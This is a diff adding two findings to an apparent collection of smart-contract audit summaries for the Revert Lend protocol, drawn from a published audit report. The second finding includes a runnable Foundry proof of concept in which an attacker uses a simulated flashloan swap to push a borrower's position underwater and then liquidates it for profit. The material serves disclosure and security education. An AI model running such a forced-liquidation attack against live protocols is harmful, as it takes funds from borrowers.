@@ -925,3 +925,224 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
   ```
 
   </details>
+
+## 8.[Medium] No minLoanSize means liquidators will have no incentive to liquidate small positions
+
+### `minLoanSize` = 0
+
+- Summary: Setting `minLoanSize` to 0 removes incentives for liquidating small underwater positions, risking the protocol's financial stability. It also enables attackers to accumulate underwater debt without liquidation. This could deplete reserves and burden lenders with bad debt cleanup costs, leading to losses for both the protocol and lenders.
+
+- Impact & Recommendation: Implementing a realistic minLoanSize will incentivize liquidators to address bad debt.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-revert-lend#m-03-no-minloansize-means-liquidators-will-have-no-incentive-to-liquidate-small-positions) & [Report](https://code4rena.com/reports/2024-03-revert-lend)
+
+## 9.[Medium] Lack of safety buffer in `_checkLoanIsHealthy` could subject users who take out the max loan into a forced liquidation
+
+### Lacks a safety buffer
+
+- Summary: The `_checkLoanIsHealthy` function in V3Vault lacks a safety buffer, increasing the risk of unfair liquidation for borrowers due to minor market movements. This vulnerability could be exploited by attackers to force liquidation for profit, potentially causing significant losses for users.
+
+- Impact & Recommendation: To prevent unfair liquidations from minor market changes, consider implementing a safety buffer for users' positions. Set a max loan threshold lower than the liquidation threshold, ensuring borrowers are protected.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-revert-lend#m-11-lack-of-safety-buffer-in-_checkloanishealthy-could-subject-users-who-take-out-the-max-loan-into-a-forced-liquidation) & [Report](https://code4rena.com/reports/2024-03-revert-lend)
+
+  <details><summary>POC</summary>
+
+  ```solidity
+    contract ProofOfConcept__Vault_transform__Uv3Utils__Forced_Liquidation__Safety_Buffer is Test {
+        uint256 constant Q32 = 2 ** 32;
+        uint256 constant Q96 = 2 ** 96;
+        uint256 constant YEAR_SECS = 31557600; // taking into account leap years
+        address constant WHALE_ACCOUNT = 0xF977814e90dA44bFA03b6295A0616a897441aceC;
+        IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+        IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
+        IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
+        INonfungiblePositionManager constant NPM = INonfungiblePositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
+        address EX0x = 0xDef1C0ded9bec7F1a1670819833240f027b25EfF; // 0x exchange proxy
+        address UNIVERSAL_ROUTER = 0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B;
+        address PERMIT2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3;
+        address constant CHAINLINK_USDC_USD = 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6;
+        address constant CHAINLINK_DAI_USD = 0xAed0c38402a5d19df6E4c03F4E2DceD6e29c1ee9;
+        address constant CHAINLINK_ETH_USD = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
+        address constant UNISWAP_DAI_USDC = 0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168; // 0.01% pool
+        address constant UNISWAP_ETH_USDC = 0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640; // 0.05% pool
+        address constant UNISWAP_DAI_USDC_005 = 0x6c6Bc977E13Df9b0de53b251522280BB72383700; // 0.05% pool
+        address constant TEST_NFT_ACCOUNT = 0x3b8ccaa89FcD432f1334D35b10fF8547001Ce3e5;
+        uint256 constant TEST_NFT = 126; // DAI/USDC 0.05% - in range (-276330/-276320)
+        address constant TEST_NFT_ACCOUNT_2 = 0x454CE089a879F7A0d0416eddC770a47A1F47Be99;
+        uint256 constant TEST_NFT_2 = 1047; // DAI/USDC 0.05% - in range (-276330/-276320)
+        uint256 constant TEST_NFT_UNI = 1; // WETH/UNI 0.3%
+        uint256 mainnetFork;
+        V3Vault vault;
+        InterestRateModel interestRateModel;
+        V3Oracle oracle;
+        address alice = vm.addr(9);
+        address eve = vm.addr(8);
+        address bob = vm.addr(7);
+        bool shouldReenter = false;
+        function setUp() external {
+            mainnetFork = vm.createFork("https://eth-mainnet.g.alchemy.com/v2/[YOUR-RPC-URL]", 18521658);
+            vm.selectFork(mainnetFork);
+            // 0% base rate - 5% multiplier - after 80% - 109% jump multiplier (like in compound v2 deployed)  (-> max rate 25.8% per year)
+            interestRateModel = new InterestRateModel(0, Q96 * 5 / 100, Q96 * 109 / 100, Q96 * 80 / 100);
+            // use tolerant oracles (so timewarp for until 30 days works in tests - also allow divergence from price for mocked price results)
+            oracle = new V3Oracle(NPM, address(USDC), address(0));
+            oracle.setTokenConfig(
+                address(USDC),
+                AggregatorV3Interface(CHAINLINK_USDC_USD),
+                3600 * 24 * 30,
+                IUniswapV3Pool(address(0)),
+                0,
+                V3Oracle.Mode.TWAP,
+                0
+            );
+            oracle.setTokenConfig(
+                address(DAI),
+                AggregatorV3Interface(CHAINLINK_DAI_USD),
+                3600 * 24 * 30,
+                IUniswapV3Pool(UNISWAP_DAI_USDC),
+                60,
+                V3Oracle.Mode.CHAINLINK_TWAP_VERIFY,
+                50000
+            );
+            oracle.setTokenConfig(
+                address(WETH),
+                AggregatorV3Interface(CHAINLINK_ETH_USD),
+                3600 * 24 * 30,
+                IUniswapV3Pool(UNISWAP_ETH_USDC),
+                60,
+                V3Oracle.Mode.CHAINLINK_TWAP_VERIFY,
+                50000
+            );
+            vault =
+                new V3Vault("Revert Lend USDC", "rlUSDC", address(USDC), NPM, interestRateModel, oracle, IPermit2(PERMIT2));
+            vault.setTokenConfig(address(USDC), uint32(Q32 * 9 / 10), type(uint32).max); // 90% collateral factor / max 100% collateral value
+            vault.setTokenConfig(address(DAI), uint32(Q32 * 9 / 10), type(uint32).max); // 90% collateral factor / max 100% collateral value
+            vault.setTokenConfig(address(WETH), uint32(Q32 * 9 / 10), type(uint32).max); // 90% collateral factor / max 100% collateral value
+            vault.setLimits(0, 100_000 * 1e6, 100_000 * 1e6, 100_000 * 1e6, 100_000 * 1e6);
+            // without reserve for now
+            vault.setReserveFactor(0);
+            vm.warp(block.timestamp + 2 days);
+        }
+        struct TempVariables {
+            uint256 wethFlashloan;
+            uint256 debt;
+            uint256 fullValue;
+            uint256 collateralValue;
+        }
+        function testForcedLiquidation() public {
+                // Setup scenario
+            ERC20 usdc = ERC20(address(USDC));
+            ERC20 weth = ERC20(address(WETH));
+            IUniswapV3Factory factory = IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);
+            IUniswapV3Pool usdcweth = IUniswapV3Pool(address(factory.getPool(address(usdc), address(weth), 500)));
+            deal(address(usdc), address(bob), 100_000 * 1e6);
+            deal(address(usdc), address(alice), 100_000 * 1e6);
+            deal(address(weth), address(alice), 10 ether);
+                    // Bob supplies liquidity to the pool
+            vm.startPrank(address(bob));
+            uint256 amount = 100_000 * 1e6;
+            usdc.approve(address(vault), type(uint256).max);
+            vault.deposit(amount, address(bob));
+            vm.stopPrank();
+                    // Alice opens a usdc - weth LP position
+            vm.startPrank(address(alice));
+            usdc.approve(address(NPM), type(uint256).max);
+            weth.approve(address(NPM), type(uint256).max);
+            // Current Tick: 200981
+            // In range Position
+            INonfungiblePositionManager.MintParams memory mp = INonfungiblePositionManager.MintParams({
+                token0: usdcweth.token0(),
+                token1: usdcweth.token1(),
+                fee: usdcweth.fee(),
+                tickLower: 	199460,
+                tickUpper:  204520,
+                amount0Desired: 50_000 * 1e6,
+                amount1Desired: 10 ether,
+                amount0Min: 0,
+                amount1Min: 0,
+                recipient: address(alice),
+                deadline: block.timestamp + 1 days
+            });
+            (uint256 tokenId,,,) = NPM.mint(mp);
+            NPM.setApprovalForAll(address(vault), true);
+            vault.create(tokenId, address(alice));
+            (,, uint256 collateralValue,,) = vault.loanInfo(tokenId);
+            vault.borrow(tokenId, collateralValue); // Borrows max collateralValue
+            vm.stopPrank();
+            assertEq(weth.balanceOf(eve), 0); // Assert Eve starts with no tokens
+            vm.startPrank(address(eve));
+            TempVariables memory tv = TempVariables({
+                wethFlashloan: 0,
+                debt: 0,
+                fullValue: 0,
+                collateralValue: 0
+            });
+            tv.wethFlashloan = 30 ether; // Flashloan value
+            deal(address(weth), address(eve), tv.wethFlashloan); // Simulate flashloan
+            // Sink the victim's position on purpose through a swap
+            weth.approve(address(0xE592427A0AEce92De3Edee1F18E0157C05861564), type(uint256).max);
+            ISwapRouter swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+            ISwapRouter.ExactInputSingleParams memory swapParams = ISwapRouter.ExactInputSingleParams({
+                tokenIn: address(weth),
+                tokenOut: address(usdc),
+                fee: 500,
+                recipient: address(eve),
+                deadline: block.timestamp,
+                amountIn: tv.wethFlashloan,
+                amountOutMinimum: 0,
+                sqrtPriceLimitX96: 0
+            });
+            swapRouter.exactInputSingle(
+                swapParams
+            );
+
+            // Perform a liquidation to kick the user off the protocol
+            (tv.debt,tv.fullValue,tv.collateralValue,,) = vault.loanInfo(tokenId);
+            usdc.approve(address(vault), type(uint256).max);
+            IVault.LiquidateParams memory lp = IVault.LiquidateParams({
+                tokenId: tokenId,
+                debtShares: tv.debt,
+                amount0Min: 0,
+                amount1Min: 0,
+                recipient: address(eve),
+                permitData: ""
+            });
+            vault.liquidate(lp);
+
+            usdc.approve(address(swapRouter), type(uint256).max);
+            // Swap back all usdc and profit
+            swapParams = ISwapRouter.ExactInputSingleParams({
+                tokenIn: address(usdc),
+                tokenOut: address(weth),
+                fee: 500,
+                recipient: address(eve),
+                deadline: block.timestamp,
+                amountIn: usdc.balanceOf(address(eve)),
+                amountOutMinimum: 0,
+                sqrtPriceLimitX96: 0
+            });
+            swapRouter.exactInputSingle(swapParams);
+            // Return flashloan
+            weth.transfer(address(0), tv.wethFlashloan); // Simulate flashloan repayment by transferring to the burn address
+            vm.stopPrank();
+
+                    // Assert that Eve profited
+            assertEq(weth.balanceOf(eve), 568684386651804250);
+        }
+        function _getTick(IUniswapV3Pool pool) internal returns(int24) {
+            (,int24 tick,,,,,) = pool.slot0();
+            return tick;
+        }
+        function _isInRange(IUniswapV3Pool pool, uint256 tokenId) internal returns(bool) {
+            int24 tick = _getTick(pool);
+            (,,,,,int24 lowerTick, int24 upperTick,,,,,) = NPM.positions(tokenId);
+            if(tick >= lowerTick && tick <= upperTick) {
+                return true;
+            }
+            return false;
+        }
+    }
+
+
+  ```
+
+  </details>
